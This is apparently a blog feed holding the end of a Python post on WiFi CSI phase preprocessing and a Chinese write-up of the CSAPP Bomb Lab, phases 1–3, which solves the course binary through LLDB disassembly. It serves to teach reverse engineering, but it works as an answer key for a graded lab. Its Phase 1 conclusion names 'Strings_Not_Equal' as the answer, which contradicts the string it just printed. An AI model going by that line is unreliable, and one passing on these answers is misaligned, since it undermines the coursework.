        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true"># 30 代表子载波数量，固定为30</span>
            <span class="token keyword">if</span> raw_data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'i'</span><span class="token punctuation">:</span>
                data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>complex<span class="token punctuation">(</span>raw_data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">'j'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>complex<span class="token punctuation">(</span>raw_data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> data

<span class="token keyword">def</span> <span class="token function">getAP</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""
    根据复数计算振幅和相位
    """</span>
    amplitudes <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">30</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>N<span class="token punctuation">)</span><span class="token punctuation">]</span>
    phases <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">30</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>N<span class="token punctuation">)</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> m <span class="token keyword">in</span> range<span class="token punctuation">(</span>N<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            r <span class="token operator">=</span> sqrt<span class="token punctuation">(</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span>i <span class="token operator">+</span> m <span class="token operator">*</span> <span class="token number">30</span><span class="token punctuation">]</span><span class="token punctuation">.</span>real<span class="token punctuation">)</span> <span class="token operator">**</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token punctuation">(</span>data<span class="token punctuation">[</span>i <span class="token operator">+</span> m <span class="token operator">*</span> <span class="token number">30</span><span class="token punctuation">]</span><span class="token punctuation">.</span>imag<span class="token punctuation">)</span> <span class="token operator">**</span> <span class="token number">2</span><span class="token punctuation">)</span>
            amplitudes<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span>r<span class="token punctuation">)</span>
            phases<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span>np<span class="token punctuation">.</span>angle<span class="token punctuation">(</span>data<span class="token punctuation">[</span>i <span class="token operator">+</span> m <span class="token operator">*</span> <span class="token number">30</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span>amplitudes<span class="token punctuation">,</span> phases<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">preprocessingPhase</span><span class="token punctuation">(</span>phases<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""
    将相位进行线性变换
    index是 -28 到 28 根据 IEEE 802.11n 协议
    返回变换后的相位
    """</span>
    index <span class="token operator">=</span> range<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">28</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> range<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> m <span class="token keyword">in</span> range<span class="token punctuation">(</span>N<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> l <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            clear <span class="token operator">=</span> <span class="token boolean">True</span>
            base <span class="token operator">=</span> <span class="token number">0</span>
            tphases<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> phases<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>

            <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token keyword">if</span> phases<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> phases<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span> <span class="token operator">></span> pi<span class="token punctuation">:</span>
                    base <span class="token operator">+=</span> <span class="token number">1</span>
                    clear <span class="token operator">=</span> <span class="token boolean">False</span>
                <span class="token keyword">elif</span> phases<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> phases<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token operator">-</span>pi<span class="token punctuation">:</span>
                    base <span class="token operator">-=</span> <span class="token number">1</span>
                    clear <span class="token operator">=</span> <span class="token boolean">False</span>
                tphases<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> phases<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">2</span> <span class="token operator">*</span> pi <span class="token operator">*</span> base

            <span class="token keyword">if</span> clear <span class="token operator">==</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
                <span class="token keyword">break</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                    phases<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> tphases<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token punctuation">(</span>tphases<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span> <span class="token operator">-</span> tphases<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> 
                                    <span class="token operator">*</span> <span class="token number">1.0</span> <span class="token operator">/</span><span class="token punctuation">(</span><span class="token number">28</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">28</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>index<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> 
                                    <span class="token operator">-</span> <span class="token number">1.0</span> <span class="token operator">/</span> <span class="token number">30</span> <span class="token operator">*</span> sum<span class="token punctuation">(</span><span class="token punctuation">[</span>tphases<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> phases
</code></pre>
<h2 id="u53C2_u8003_u8BBA_u6587"><a href="#u53C2_u8003_u8BBA_u6587" class="headerlink" title="参考论文"></a>参考论文</h2><ol>
<li>PADS Passive Detection of Moving Targets with Dynamic Speed using PHY Layer Information</li>
</ol>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[CSAPP Lab2 解题分析]]></title>
      <url>http://xinqiu.me/2016/02/10/csapp-lab2-bomb/</url>
      <content type="html"><![CDATA[<p>Lab2 的 Bomb是个非常有意思的实验，比起之前耗脑的Lab1，这个Lab主要是学习反汇编。</p>
<p>这里我的环境是OS X EI Capitan，Lab2是[Updated 1/12/16].</p>
<!--toc-->
<h2 id="Phase1"><a href="#Phase1" class="headerlink" title="Phase1"></a>Phase1</h2><p>在Mac上是默认没有GDB的，可以使用LLDB来代替。</p>
<p>进入lldb</p>
<pre class=" language-bash"><code class="language-bash">lldb bomb
</code></pre>
<p>使用<code>disassemble</code>进行反汇编,参考<code>bomb.c</code>文件，可以知道主要的几个函数名。</p>
<p>首先是Phase_1</p>
<pre class=" language-bash"><code class="language-bash"><span class="token punctuation">(</span>lldb<span class="token punctuation">)</span> disas -n phase_1
</code></pre>
<p>得到以下汇编代码</p>
<pre class=" language-html"><code class="language-html">bomb`phase_1:
bomb[0x400ee0] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+0</span><span class="token punctuation">></span></span>:  subq   $0x8, %rsp
bomb[0x400ee4] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+4</span><span class="token punctuation">></span></span>:  movl   $0x402400, %esi
bomb[0x400ee9] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+9</span><span class="token punctuation">></span></span>:  callq  0x401338                  ; strings_not_equal
bomb[0x400eee] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+14</span><span class="token punctuation">></span></span>: testl  %eax, %eax
bomb[0x400ef0] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+16</span><span class="token punctuation">></span></span>: je     0x400ef7                  ; <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+23</span><span class="token punctuation">></span></span>
bomb[0x400ef2] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+18</span><span class="token punctuation">></span></span>: callq  0x40143a                  ; explode_bomb
bomb[0x400ef7] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+23</span><span class="token punctuation">></span></span>: addq   $0x8, %rsp
bomb[0x400efb] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+27</span><span class="token punctuation">></span></span>: retq
</code></pre>
<p>这段代码还是挺好理解的，保存<code>Stack pointer</code>,将<code>$0x402400</code>传给<code>%esi</code>,调用位于<code>0x401338</code>的<code>strings_not_equal</code>函数，比较<code>%eax</code>是否为0，不为零则调用<code>explode_bomb</code>函数，为零则返回。</p>
<p>所以关键要找出字符串是什么。根据上述的汇编代码，可以发现字符串被保存在<code>0x402400</code>这个内存里，所以使用<code>x/s</code>来查看。</p>
<pre class=" language-html"><code class="language-html">(lldb) x/s 0x402400
</code></pre>
<p>得到</p>
<pre class=" language-html"><code class="language-html">0x00402400: "Border relations with Canada have never been better."
</code></pre>
<p>所以第一关的答案是<code>Strings_Not_Equal</code></p>
<a id="more"></a>
<h2 id="Phase2"><a href="#Phase2" class="headerlink" title="Phase2"></a>Phase2</h2><p>同样，还是先反汇编出代码</p>
<pre class=" language-html"><code class="language-html">bomb`phase_2:
bomb[0x400efc] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+0</span><span class="token punctuation">></span></span>:  pushq  %rbp
bomb[0x400efd] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+1</span><span class="token punctuation">></span></span>:  pushq  %rbx
bomb[0x400efe] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+2</span><span class="token punctuation">></span></span>:  subq   $0x28, %rsp
bomb[0x400f02] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+6</span><span class="token punctuation">></span></span>:  movq   %rsp, %rsi
bomb[0x400f05] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+9</span><span class="token punctuation">></span></span>:  callq  0x40145c                  ; read_six_numbers
bomb[0x400f0a] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+14</span><span class="token punctuation">></span></span>: cmpl   $0x1, (%rsp)
bomb[0x400f0e] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+18</span><span class="token punctuation">></span></span>: je     0x400f30                  ; <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+52</span><span class="token punctuation">></span></span>
bomb[0x400f10] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+20</span><span class="token punctuation">></span></span>: callq  0x40143a                  ; explode_bomb
bomb[0x400f15] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+25</span><span class="token punctuation">></span></span>: jmp    0x400f30                  ; <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+52</span><span class="token punctuation">></span></span>
bomb[0x400f17] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+27</span><span class="token punctuation">></span></span>: movl   -0x4(%rbx), %eax
bomb[0x400f1a] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+30</span><span class="token punctuation">></span></span>: addl   %eax, %eax
bomb[0x400f1c] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+32</span><span class="token punctuation">></span></span>: cmpl   %eax, (%rbx)
bomb[0x400f1e] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+34</span><span class="token punctuation">></span></span>: je     0x400f25                  ; <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+41</span><span class="token punctuation">></span></span>
bomb[0x400f20] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+36</span><span class="token punctuation">></span></span>: callq  0x40143a                  ; explode_bomb
bomb[0x400f25] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+41</span><span class="token punctuation">></span></span>: addq   $0x4, %rbx
bomb[0x400f29] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+45</span><span class="token punctuation">></span></span>: cmpq   %rbp, %rbx
bomb[0x400f2c] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+48</span><span class="token punctuation">></span></span>: jne    0x400f17                  ; <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+27</span><span class="token punctuation">></span></span>
bomb[0x400f2e] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+50</span><span class="token punctuation">></span></span>: jmp    0x400f3c                  ; <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+64</span><span class="token punctuation">></span></span>
bomb[0x400f30] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+52</span><span class="token punctuation">></span></span>: leaq   0x4(%rsp), %rbx
bomb[0x400f35] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+57</span><span class="token punctuation">></span></span>: leaq   0x18(%rsp), %rbp
bomb[0x400f3a] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+62</span><span class="token punctuation">></span></span>: jmp    0x400f17                  ; <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+27</span><span class="token punctuation">></span></span>
bomb[0x400f3c] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+64</span><span class="token punctuation">></span></span>: addq   $0x28, %rsp
bomb[0x400f40] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+68</span><span class="token punctuation">></span></span>: popq   %rbx
bomb[0x400f41] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+69</span><span class="token punctuation">></span></span>: popq   %rbp
bomb[0x400f42] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+70</span><span class="token punctuation">></span></span>: retq
</code></pre>
<p>从上述汇编中，可以发现从%rsp位置开始保存数字。</p>
<p>反汇编<code>read_six_numbers</code>得到</p>
<pre class=" language-html"><code class="language-html">bomb`read_six_numbers:
bomb[0x40145c] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+0</span><span class="token punctuation">></span></span>:  subq   $0x18, %rsp
bomb[0x401460] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+4</span><span class="token punctuation">></span></span>:  movq   %rsi, %rdx
bomb[0x401463] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+7</span><span class="token punctuation">></span></span>:  leaq   0x4(%rsi), %rcx
bomb[0x401467] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+11</span><span class="token punctuation">></span></span>: leaq   0x14(%rsi), %rax
bomb[0x40146b] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+15</span><span class="token punctuation">></span></span>: movq   %rax, 0x8(%rsp)
bomb[0x401470] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+20</span><span class="token punctuation">></span></span>: leaq   0x10(%rsi), %rax
bomb[0x401474] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+24</span><span class="token punctuation">></span></span>: movq   %rax, (%rsp)
bomb[0x401478] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+28</span><span class="token punctuation">></span></span>: leaq   0xc(%rsi), %r9
bomb[0x40147c] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+32</span><span class="token punctuation">></span></span>: leaq   0x8(%rsi), %r8
bomb[0x401480] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+36</span><span class="token punctuation">></span></span>: movl   $0x4025c3, %esi
bomb[0x401485] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+41</span><span class="token punctuation">></span></span>: movl   $0x0, %eax
bomb[0x40148a] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+46</span><span class="token punctuation">></span></span>: callq  0x400bf0                  ; symbol stub for: __isoc99_sscanf
bomb[0x40148f] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+51</span><span class="token punctuation">></span></span>: cmpl   $0x5, %eax
bomb[0x401492] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+54</span><span class="token punctuation">></span></span>: jg     0x401499                  ; <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+61</span><span class="token punctuation">></span></span>
bomb[0x401494] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+56</span><span class="token punctuation">></span></span>: callq  0x40143a                  ; explode_bomb
bomb[0x401499] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+61</span><span class="token punctuation">></span></span>: addq   $0x18, %rsp
bomb[0x40149d] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+65</span><span class="token punctuation">></span></span>: retq
</code></pre>
<p>根据Phase1,很敏感的会发现<code>movl   $0x4025c3, %esi</code>这行。通过之前一样的方法，得到<code>0x4025c3</code>内存里的字符串，</p>
<pre class=" language-html"><code class="language-html">0x004025c3: "%d %d %d %d %d %d"
</code></pre>
<p>再根据<code>bomb[0x40148a] &lt;+46&gt;: callq  0x400bf0                  ; symbol stub for: __isoc99_sscanf</code>这句，猜一下，立马就能联想到<code>scanf(&quot;%d %d %d %d %d %d&quot;,a,b,c,d,e,f);</code>，也就是说，输入的格式已经确定了。</p>
<p><code>bomb[0x40145c] &lt;+0&gt;:  subq   $0x18, %rsp</code>这行也暗示了之前<code>bomb[0x400f35] &lt;+57&gt;: leaq   0x18(%rsp), %rbp</code>为什么是0x18(%rsp)。</p>
<p>回到<code>phase_2</code>，根据<code>cmpl   $0x1, (%rsp)</code>和下一行汇编语句，很容易知道第一个数是1.<br>接着跳到了<code>&lt;+52&gt;</code>,将0x4(%rsp)指向内存里的值传给%rbx,将0x18(%rsp)指向内存里的值传给%rbp。</p>
<pre class=" language-html"><code class="language-html">bomb[0x400f17] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+27</span><span class="token punctuation">></span></span>: movl   -0x4(%rbx), %eax
bomb[0x400f1a] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+30</span><span class="token punctuation">></span></span>: addl   %eax, %eax
bomb[0x400f1c] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+32</span><span class="token punctuation">></span></span>: cmpl   %eax, (%rbx)
bomb[0x400f1e] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+34</span><span class="token punctuation">></span></span>: je     0x400f25
</code></pre>
<p>这段代码是循环里的部分</p>
<pre class=" language-html"><code class="language-html">bomb[0x400f25] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+41</span><span class="token punctuation">></span></span>: addq   $0x4, %rbx
bomb[0x400f29] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+45</span><span class="token punctuation">></span></span>: cmpq   %rbp, %rbx
bomb[0x400f2c] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+48</span><span class="token punctuation">></span></span>: jne    0x400f17                  ; <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+27</span><span class="token punctuation">></span></span>
bomb[0x400f2e] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+50</span><span class="token punctuation">></span></span>: jmp    0x400f3c                  ; <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+64</span><span class="token punctuation">></span></span>
</code></pre>
<p>这是循环条件</p>
<p>所以可以得出这6个数是等比数列<code>1 2 4 8 16 32</code></p>
<h2 id="Phase3"><a href="#Phase3" class="headerlink" title="Phase3"></a>Phase3</h2><pre class=" language-html"><code class="language-html">bomb`phase_3:
bomb[0x400f43] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+0</span><span class="token punctuation">></span></span>:   subq   $0x18, %rsp
bomb[0x400f47] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+4</span><span class="token punctuation">></span></span>:   leaq   0xc(%rsp), %rcx
bomb[0x400f4c] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+9</span><span class="token punctuation">></span></span>:   leaq   0x8(%rsp), %rdx
bomb[0x400f51] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+14</span><span class="token punctuation">></span></span>:  movl   $0x4025cf, %esi
bomb[0x400f56] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+19</span><span class="token punctuation">></span></span>:  movl   $0x0, %eax
bomb[0x400f5b] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+24</span><span class="token punctuation">></span></span>:  callq  0x400bf0                  ; symbol stub for: __isoc99_sscanf
bomb[0x400f60] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+29</span><span class="token punctuation">></span></span>:  cmpl   $0x1, %eax
bomb[0x400f63] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+32</span><span class="token punctuation">></span></span>:  jg     0x400f6a                  ; <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+39</span><span class="token punctuation">></span></span>
bomb[0x400f65] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+34</span><span class="token punctuation">></span></span>:  callq  0x40143a                  ; explode_bomb
bomb[0x400f6a] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+39</span><span class="token punctuation">></span></span>:  cmpl   $0x7, 0x8(%rsp)
bomb[0x400f6f] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+44</span><span class="token punctuation">></span></span>:  ja     0x400fad                  ; <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+106</span><span class="token punctuation">></span></span>
bomb[0x400f71] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+46</span><span class="token punctuation">></span></span>:  movl   0x8(%rsp), %eax
bomb[0x400f75] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+50</span><span class="token punctuation">></span></span>:  jmpq   *0x402470(,%rax,8)
bomb[0x400f7c] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+57</span><span class="token punctuation">></span></span>:  movl   $0xcf, %eax
bomb[0x400f81] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+62</span><span class="token punctuation">></span></span>:  jmp    0x400fbe                  ; <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+123</span><span class="token punctuation">></span></span>
bomb[0x400f83] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+64</span><span class="token punctuation">></span></span>:  movl   $0x2c3, %eax
bomb[0x400f88] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+69</span><span class="token punctuation">></span></span>:  jmp    0x400fbe                  ; <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+123</span><span class="token punctuation">></span></span>
bomb[0x400f8a] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+71</span><span class="token punctuation">></span></span>:  movl   $0x100, %eax
bomb[0x400f8f] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+76</span><span class="token punctuation">></span></span>:  jmp    0x400fbe                  ; <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+123</span><span class="token punctuation">></span></span>
bomb[0x400f91] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+78</span><span class="token punctuation">></span></span>:  movl   $0x185, %eax
bomb[0x400f96] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+83</span><span class="token punctuation">></span></span>:  jmp    0x400fbe                  ; <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+123</span><span class="token punctuation">></span></span>
bomb[0x400f98] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+85</span><span class="token punctuation">></span></span>:  movl   $0xce, %eax
bomb[0x400f9d] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+90</span><span class="token punctuation">></span></span>:  jmp    0x400fbe                  ; <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+123</span><span class="token punctuation">></span></span>
bomb[0x400f9f] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+92</span><span class="token punctuation">></span></span>:  movl   $0x2aa, %eax
bomb[0x400fa4] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+97</span><span class="token punctuation">></span></span>:  jmp    0x400fbe                  ; <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+123</span><span class="token punctuation">></span></span>
bomb[0x400fa6] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+99</span><span class="token punctuation">></span></span>:  movl   $0x147, %eax
bomb[0x400fab] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+104</span><span class="token punctuation">></span></span>: jmp    0x400fbe                  ; <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+123</span><span class="token punctuation">></span></span>
bomb[0x400fad] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+106</span><span class="token punctuation">></span></span>: callq  0x40143a                  ; explode_bomb
bomb[0x400fb2] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+111</span><span class="token punctuation">></span></span>: movl   $0x0, %eax
bomb[0x400fb7] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+116</span><span class="token punctuation">></span></span>: jmp    0x400fbe                  ; <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+123</span><span class="token punctuation">></span></span>
bomb[0x400fb9] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+118</span><span class="token punctuation">></span></span>: movl   $0x137, %eax
bomb[0x400fbe] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+123</span><span class="token punctuation">></span></span>: cmpl   0xc(%rsp), %eax
bomb[0x400fc2] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+127</span><span class="token punctuation">></span></span>: je     0x400fc9                  ; <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+134</span><span class="token punctuation">></span></span>
bomb[0x400fc4] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+129</span><span class="token punctuation">></span></span>: callq  0x40143a                  ; explode_bomb
bomb[0x400fc9] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+134</span><span class="token punctuation">></span></span>: addq   $0x18, %rsp
bomb[0x400fcd] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+138</span><span class="token punctuation">></span></span>: retq
</code></pre>
<p>代码还挺长。</p>
<p>同样，根据<code>bomb[0x400f51] &lt;+14&gt;:  movl   $0x4025cf, %esi</code>可以得到<code>%d %d</code>这个格式，代表要输入两个整数。</p>
